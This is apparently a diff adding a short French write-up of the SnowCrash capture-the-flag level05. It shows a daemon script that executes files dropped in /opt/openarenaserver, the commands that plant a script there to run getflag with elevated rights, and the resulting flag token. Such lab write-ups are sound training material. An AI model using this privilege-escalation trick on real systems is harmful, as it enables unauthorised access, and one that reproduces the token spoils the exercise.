@@ -1,0 +1,19 @@
+On voit que flag05 a acces au fichier /usr/sbin/openarenaserver qui contient:
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
+done
+
+On voit donc qu'un demon tourne executant les scripts present dans /opt/openarenaserver/ avec les droits de flag05.
+Il suffit donc de creer un script qui ecrit la sortie de la fonction getflag dans un fichier ou nous avons les droits, d'attendre que le demon "passe"
+et nous aurons le flag!
+level05@SnowCrash:/opt$ echo "getflag > /tmp/flag;" > /tmp/test; cp /tmp/test  /opt/openarenaserver/test; chmod 777 /opt/openarenaserver/test
+
+Il suffit d'attendre que le fichier /tmp/flag soit cree et de le lire:
+level05@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Voila!
